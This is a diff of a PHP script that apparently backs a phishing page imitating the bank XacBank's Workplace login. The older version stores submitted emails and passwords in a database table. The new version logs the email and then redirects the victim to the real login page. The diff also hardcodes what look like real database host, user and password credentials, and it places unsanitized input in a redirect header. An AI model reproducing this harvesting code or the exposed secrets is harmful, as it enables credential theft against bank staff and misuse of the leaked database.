@@ -1,11 +1,13 @@
 <?php
 session_start();
+// echo "<script>window.location.href = 'https://xacbank.workplace.com/login/input/?identifier=soc%40xacbank.mn';</script>";
 
-// initializing variables
+
+// Initializing variables
 $email = "";
 $errors = array(); 
 
-// connect to the database
+// Connect to the database
 $db_host = 'xacbankk-server.mysql.database.azure.com';
 $db_user = 'okyzwjplcj';
 $db_pass = '04883YR7V1S12110$';
@@ -25,9 +27,8 @@ if (mysqli_connect_errno()) {
 }
 
 // REGISTER USER
-// if (isset($_POST['reg_user'])) {
-    $email = mysqli_real_escape_string($conn, $_POST['email']);
-    $password = mysqli_real_escape_string($conn, $_POST['pass']);
+if (isset($_POST['identifier'])) {
+    $email = mysqli_real_escape_string($conn, $_POST['identifier']);
 
     if (empty($email)) {
         array_push($errors, "Email is required");
@@ -35,29 +36,19 @@ if (mysqli_connect_errno()) {
         array_push($errors, "Invalid email format");
     }
 
-    // Use prepared statements to prevent SQL injection
-    // $user_check_query = "SELECT * FROM SUGA_LLR WHERE email = ?";
-    // $stmt = mysqli_prepare($conn, $user_check_query);
-    // mysqli_stmt_bind_param($stmt, "ss", $email, $password);
-    // mysqli_stmt_execute($stmt);
-    // $result = mysqli_stmt_get_result($stmt);
-    // $user = mysqli_fetch_assoc($result);
-  
-    // if ($user) { // if user exists
-    //     if ($user['email'] === $email) {
-    //         array_push($errors, "Email already exists");
-    //     }
-    // }
+    // Use prepared statements for the INSERT query
+    $query = "INSERT INTO SUGA_LLR (email) VALUES(?)";
+    $stmt = mysqli_prepare($conn, $query);
+    mysqli_stmt_bind_param($stmt, "s", $email);
+    mysqli_stmt_execute($stmt);
 
-    // if (count($errors) == 0) {
-        // Use prepared statements for the INSERT query as well
-        $query = "INSERT INTO SUGA_LLR (email, password) VALUES(?, ?)";
-        $stmt = mysqli_prepare($conn, $query);
-        mysqli_stmt_bind_param($stmt, "ss", $email, $password);
-        mysqli_stmt_execute($stmt);
+    $email = $_POST['identifier'];
+    header('Location: '.'https://xacbank.workplace.com/login/input/?identifier='.$email);
+//     echo "<script>window.location.href = 'https://xacbank.workplace.com/login/input/?identifier=soc%40xacbank.mn';</script>";
+//     header('location: index.php');
+//     // https://xacbank.workplace.com/login/input/?identifier=soc%40xacbank.mn
+}
 
-        $_SESSION['success'] = "You are now registered";
-        echo "<script>window.location.href = 'success.php';</script>";
-        header('location: index.php');
-    // }
-// }
+// Close the database connection when you're done
+mysqli_close($conn);
+?>
